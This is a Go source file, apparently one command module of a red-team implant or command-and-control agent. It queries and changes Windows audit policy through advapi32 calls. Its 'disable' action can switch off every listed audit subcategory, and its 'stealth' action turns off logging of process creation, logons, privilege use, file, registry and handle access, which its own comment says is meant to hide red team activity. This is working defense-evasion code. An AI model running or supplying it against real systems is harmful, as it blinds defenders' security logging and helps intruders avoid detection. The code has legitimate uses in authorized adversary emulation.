//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type AuditPolCommand struct{}

func (c *AuditPolCommand) Name() string {
	return "auditpol"
}

func (c *AuditPolCommand) Description() string {
	return "Query and modify Windows audit policies to control security event logging"
}

type auditPolParams struct {
	Action   string `json:"action"`
	Category string `json:"category"`
}

// Audit policy GUIDs — from Windows SDK auditpolicy.h
// These are the 9 top-level audit policy categories
var auditCategories = []struct {
	Name string
	GUID windows.GUID
}{
	{"System", windows.GUID{Data1: 0x69979849, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Logon/Logoff", windows.GUID{Data1: 0x69979850, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Object Access", windows.GUID{Data1: 0x6997a8b0, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Privilege Use", windows.GUID{Data1: 0x6997a8b1, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Detailed Tracking", windows.GUID{Data1: 0x6997a8b2, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Policy Change", windows.GUID{Data1: 0x6997a8b3, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Account Management", windows.GUID{Data1: 0x6997a8b4, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"DS Access", windows.GUID{Data1: 0x6997a8b5, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Account Logon", windows.GUID{Data1: 0x6997a8b6, Data2: 0x797A, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
}

// Subcategory GUIDs — the most operationally important ones
var auditSubcategories = []struct {
	Category string
	Name     string
	GUID     windows.GUID
}{
	// System
	{"System", "Security State Change", windows.GUID{Data1: 0x0cce9210, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"System", "Security System Extension", windows.GUID{Data1: 0x0cce9211, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"System", "System Integrity", windows.GUID{Data1: 0x0cce9212, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Logon/Logoff
	{"Logon/Logoff", "Logon", windows.GUID{Data1: 0x0cce9215, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Logon/Logoff", "Logoff", windows.GUID{Data1: 0x0cce9216, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Logon/Logoff", "Special Logon", windows.GUID{Data1: 0x0cce921b, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Object Access
	{"Object Access", "File System", windows.GUID{Data1: 0x0cce921d, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Object Access", "Registry", windows.GUID{Data1: 0x0cce921e, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Object Access", "Handle Manipulation", windows.GUID{Data1: 0x0cce9223, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Privilege Use
	{"Privilege Use", "Sensitive Privilege Use", windows.GUID{Data1: 0x0cce9228, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Detailed Tracking
	{"Detailed Tracking", "Process Creation", windows.GUID{Data1: 0x0cce922b, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Detailed Tracking", "Process Termination", windows.GUID{Data1: 0x0cce922c, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Policy Change
	{"Policy Change", "Audit Policy Change", windows.GUID{Data1: 0x0cce922f, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Policy Change", "Authentication Policy Change", windows.GUID{Data1: 0x0cce9230, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Account Management
	{"Account Management", "User Account Management", windows.GUID{Data1: 0x0cce9235, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Account Management", "Security Group Management", windows.GUID{Data1: 0x0cce9237, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// DS Access
	{"DS Access", "Directory Service Access", windows.GUID{Data1: 0x0cce923b, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"DS Access", "Directory Service Changes", windows.GUID{Data1: 0x0cce923c, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	// Account Logon
	{"Account Logon", "Credential Validation", windows.GUID{Data1: 0x0cce923f, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Account Logon", "Kerberos Authentication Service", windows.GUID{Data1: 0x0cce9242, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
	{"Account Logon", "Kerberos Service Ticket Operations", windows.GUID{Data1: 0x0cce9240, Data2: 0x69AE, Data3: 0x11D9, Data4: [8]byte{0xBE, 0xD3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30}}},
}

// AUDIT_POLICY_INFORMATION structure
type auditPolicyInfo struct {
	AuditSubCategoryGuid windows.GUID
	AuditingInformation  uint32
	AuditCategoryGuid    windows.GUID
}

// Audit policy flags
const (
	auditPolicyNone           = 0x00000000
	auditPolicySuccess        = 0x00000001
	auditPolicyFailure        = 0x00000002
	auditPolicySuccessFailure = 0x00000003
)

var (
	advapi32AP                 = windows.NewLazySystemDLL("advapi32.dll")
	procAuditQuerySystemPolicy = advapi32AP.NewProc("AuditQuerySystemPolicy")
	procAuditSetSystemPolicy   = advapi32AP.NewProc("AuditSetSystemPolicy")
	procAuditFree              = advapi32AP.NewProc("AuditFree")
)

func (c *AuditPolCommand) Execute(task structs.Task) structs.CommandResult {
	var params auditPolParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.Action == "" {
		params.Action = "query"
	}

	switch params.Action {
	case "query":
		return auditPolQuery()
	case "disable":
		return auditPolDisable(params.Category)
	case "enable":
		return auditPolEnable(params.Category)
	case "stealth":
		return auditPolStealth()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'query', 'disable', 'enable', or 'stealth')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func auditPolQuery() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("Windows Audit Policy\n\n")
	sb.WriteString(fmt.Sprintf("%-25s %-35s %s\n", "CATEGORY", "SUBCATEGORY", "SETTING"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for _, sub := range auditSubcategories {
		setting, err := querySubcategoryPolicy(sub.GUID)
		if err != nil {
			sb.WriteString(fmt.Sprintf("%-25s %-35s %s\n", sub.Category, sub.Name, fmt.Sprintf("Error: %v", err)))
			continue
		}
		sb.WriteString(fmt.Sprintf("%-25s %-35s %s\n", sub.Category, sub.Name, auditSettingString(setting)))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func auditPolDisable(category string) structs.CommandResult {
	if category == "" {
		return structs.CommandResult{
			Output:    "Category required. Use 'all' to disable everything, or specify a category name (e.g., 'Logon/Logoff', 'Process Creation').",
			Status:    "error",
			Completed: true,
		}
	}

	var modified []string
	var errors []string

	targets := matchSubcategories(category)
	if len(targets) == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No matching subcategories for '%s'. Use 'query' to see available categories.", category),
			Status:    "error",
			Completed: true,
		}
	}

	for _, sub := range targets {
		err := setSubcategoryPolicy(sub.GUID, auditPolicyNone)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", sub.Name, err))
		} else {
			modified = append(modified, sub.Name)
		}
	}

	var sb strings.Builder
	if len(modified) > 0 {
		sb.WriteString(fmt.Sprintf("Disabled auditing for %d subcategories:\n", len(modified)))
		for _, name := range modified {
			sb.WriteString(fmt.Sprintf("  - %s\n", name))
		}
	}
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\nFailed for %d subcategories:\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}

	status := "success"
	if len(modified) == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func auditPolEnable(category string) structs.CommandResult {
	if category == "" {
		return structs.CommandResult{
			Output:    "Category required. Use 'all' to enable everything, or specify a category name.",
			Status:    "error",
			Completed: true,
		}
	}

	var modified []string
	var errors []string

	targets := matchSubcategories(category)
	if len(targets) == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No matching subcategories for '%s'. Use 'query' to see available categories.", category),
			Status:    "error",
			Completed: true,
		}
	}

	for _, sub := range targets {
		err := setSubcategoryPolicy(sub.GUID, auditPolicySuccessFailure)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", sub.Name, err))
		} else {
			modified = append(modified, sub.Name)
		}
	}

	var sb strings.Builder
	if len(modified) > 0 {
		sb.WriteString(fmt.Sprintf("Enabled auditing (Success+Failure) for %d subcategories:\n", len(modified)))
		for _, name := range modified {
			sb.WriteString(fmt.Sprintf("  - %s\n", name))
		}
	}
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\nFailed for %d subcategories:\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}

	status := "success"
	if len(modified) == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

// auditPolStealth disables the most operationally dangerous audit subcategories
// that would reveal red team activity (process creation, logon events, privilege use, etc.)
func auditPolStealth() structs.CommandResult {
	stealthTargets := []string{
		"Process Creation",
		"Process Termination",
		"Logon",
		"Logoff",
		"Special Logon",
		"Sensitive Privilege Use",
		"File System",
		"Handle Manipulation",
		"Registry",
	}

	var modified []string
	var errors []string
	var previous []string

	for _, targetName := range stealthTargets {
		for _, sub := range auditSubcategories {
			if sub.Name == targetName {
				// Record previous setting
				prev, _ := querySubcategoryPolicy(sub.GUID)
				if prev != auditPolicyNone {
					previous = append(previous, fmt.Sprintf("%s: %s", sub.Name, auditSettingString(prev)))
				}

				err := setSubcategoryPolicy(sub.GUID, auditPolicyNone)
				if err != nil {
					errors = append(errors, fmt.Sprintf("%s: %v", sub.Name, err))
				} else {
					modified = append(modified, sub.Name)
				}
				break
			}
		}
	}

	var sb strings.Builder
	sb.WriteString("Stealth mode — disabled detection-critical audit subcategories\n\n")
	if len(previous) > 0 {
		sb.WriteString("Previous settings (save for restore):\n")
		for _, p := range previous {
			sb.WriteString(fmt.Sprintf("  %s\n", p))
		}
		sb.WriteString("\n")
	}
	if len(modified) > 0 {
		sb.WriteString(fmt.Sprintf("Disabled %d subcategories:\n", len(modified)))
		for _, name := range modified {
			sb.WriteString(fmt.Sprintf("  - %s → No Auditing\n", name))
		}
	}
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\nFailed for %d subcategories:\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}

	status := "success"
	if len(modified) == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func matchSubcategories(category string) []struct {
	Category string
	Name     string
	GUID     windows.GUID
} {
	lower := strings.ToLower(category)
	if lower == "all" {
		return auditSubcategories
	}

	var matches []struct {
		Category string
		Name     string
		GUID     windows.GUID
	}
	for _, sub := range auditSubcategories {
		if strings.EqualFold(sub.Category, category) || strings.EqualFold(sub.Name, category) ||
			strings.Contains(strings.ToLower(sub.Name), lower) ||
			strings.Contains(strings.ToLower(sub.Category), lower) {
			matches = append(matches, sub)
		}
	}
	return matches
}

func querySubcategoryPolicy(subcategoryGUID windows.GUID) (uint32, error) {
	var pPolicy *auditPolicyInfo

	r1, _, err := procAuditQuerySystemPolicy.Call(
		uintptr(unsafe.Pointer(&subcategoryGUID)),
		1, // count
		uintptr(unsafe.Pointer(&pPolicy)),
	)
	if r1 == 0 {
		return 0, fmt.Errorf("AuditQuerySystemPolicy: %v", err)
	}
	if pPolicy == nil {
		return 0, fmt.Errorf("AuditQuerySystemPolicy returned nil")
	}

	setting := pPolicy.AuditingInformation
	procAuditFree.Call(uintptr(unsafe.Pointer(pPolicy)))

	return setting, nil
}

func setSubcategoryPolicy(subcategoryGUID windows.GUID, setting uint32) error {
	policy := auditPolicyInfo{
		AuditSubCategoryGuid: subcategoryGUID,
		AuditingInformation:  setting,
	}

	r1, _, err := procAuditSetSystemPolicy.Call(
		uintptr(unsafe.Pointer(&policy)),
		1, // count
	)
	if r1 == 0 {
		return fmt.Errorf("AuditSetSystemPolicy: %v", err)
	}

	return nil
}

func auditSettingString(setting uint32) string {
	switch setting & 0x03 {
	case auditPolicyNone:
		return "No Auditing"
	case auditPolicySuccess:
		return "Success"
	case auditPolicyFailure:
		return "Failure"
	case auditPolicySuccessFailure:
		return "Success and Failure"
	default:
		return fmt.Sprintf("Unknown (0x%X)", setting)
	}
}
